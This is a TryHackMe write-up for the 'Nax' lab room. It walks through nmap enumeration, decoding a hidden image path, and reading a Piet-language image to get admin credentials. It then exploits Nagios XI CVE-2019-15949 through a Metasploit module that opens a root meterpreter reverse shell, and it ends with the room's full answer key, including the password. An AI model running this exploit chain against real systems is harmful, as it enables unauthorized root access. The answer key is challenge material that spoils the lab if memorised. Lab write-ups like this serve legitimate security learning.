---
author: Supaaasuge
title: Nax - TryHackMe Writeup 
date: 2024-05-04
Lastmod: 2024-05-04
description: "Writeup for the TryHackMe room - Nax"
categories:
  - TryHackMe
tags:
  - CVE-2019–15949
  - NagiosXI
---

## Enumeration

```bash
nmap -p- --min-rate 10000 --open 10.10.222.20
```
Ports open: `22`, `25`, `80`, `443`

Moving on to Service Version/TCP scan with vuilnerability detections scripts + OS detection:
```bash
sudo nmap -p22,25,80,443 -sCVT -O 10.10.222.20   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-04 23:45 EDT
Nmap scan report for 10.10.222.20
Host is up (0.33s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA)
|   256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA)
|_  256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-03-23T23:42:04
|_Not valid after:  2030-03-21T23:42:04
|_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-03-24T00:14:58
|_Not valid after:  2030-03-22T00:14:58
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 400 Bad Request
| tls-alpn: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Linux 3.10 (93%), Linux 3.18 (93%), Linux 3.19 (93%), Linux 3.2 - 4.9 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Ubuntu host
Port `22`(SSH): Version 7.2p2
Port `25`: Postfix SMTPd
- CommonName:ubuntu
Port `80`: Apache httpd 2.4.18
- CVE-2019-0211 Apache 2.4.17 < 2.4.38 Local privilege escalation
Port 443: Same as port 80

## Port 80

I then opened up firefox and check the site on port 80, and 443. 

![nagiosxi](/posts/nax-thm.png)
As you can see we found the `/nagiosxi` path from the source code.


Also, We see the line "Welcome to elements" followed by abbreviations from the periodic tables. At first, I didn't even notice this however It didn't occur to me until after I was not able to find anything useful from directory enumeration and SMTP enumeration.

Using this information, I searched for a list of abbreviations from the periodic tables.... After writing a short python script with itertools to gather the different combinations and trying directory brute forcing again... nothin. Damn. After scratching my head for bit and not getting anything back from trying to enumerate SMTP. I came back to the webpage decided to try to convert the Elements listed above to their corresponding element number then convert them to ASCII characters:

```bash
python3 -c "print(''.join([chr(i) for i in [47, 80, 73, 51, 84, 46, 80, 78, 103]]))"
/PI3T.PNg
```



This brought us to a `.png` image(name shown above), from here I decided to download so I can try and run `exiftools` on the image and see if I can't find any useful information etc, as the picture doesn't really give much away. After running the tool, I was able to find the Author of the photo; `Artist: Piet Mandrian`..... Nice!

After a quick google search of `piet`, one of the first pages was for an **esolang** (esoteric language) called `Piet`. Piet is described as a stack-based esoteric programming language in which programs look like abstract Paintings. This fits the picture we downloaded, so I then looked up a online translator for Piet. 

After running the image through the interpreter, we successfully got what looks like the `admin` username/password to then login as, nice!


After logging in, we are able to see that the Version of the version of Nagios XI in use is version `5.5.6`. 

**CVE-2019–15949**
Nagios 5.6.6 and prior allows remote command execution as **root**. The exploit requires access to the server as the nagios user. Or access as the admin user via the web interface. The `getprofile.sh` script invoked by downloading a system profile is executed as root via a passwordless sudo entry; the script executes check_plugin, which is owned by the nagios user. A user logged into NagiosXI with permissions to modify plugins, or the nagios user on the server, can modify the check_plugin executable and inseart malicious commands to execute as root.

To get root on this machine, you simply need to run the correct metasploit exploit, which if you selected the CVE above... will give you a shell as root!

```bash
$ msfconsole -q
[*] Starting persistent handler(s)...
msf5 > search CVE-2019-15949

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/linux/http/nagios_xi_authenticated_rce  2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution


msf5 > use 0
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_authenticated_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to NagiosXI
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   nagiosadmin      yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux (x64)


msf5 exploit(linux/http/nagios_xi_authenticated_rce) > exploit
# shell as root!
```




###### Questions
What hidden file did you find?
> `/PI3T.PNg`

Who is the creator of the file?
> `Piet Mandrian`

What is the username found?
> `nagiosadmin`

What is the password you found?
> `n3p3UQ&9BjLp4$7uhWdY`

What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
> `CVE-2019-15949`

What is the full path of the exploit on `msfconsole`?
> `exploit/linux/http/nagios_xi_authenticated_rce`
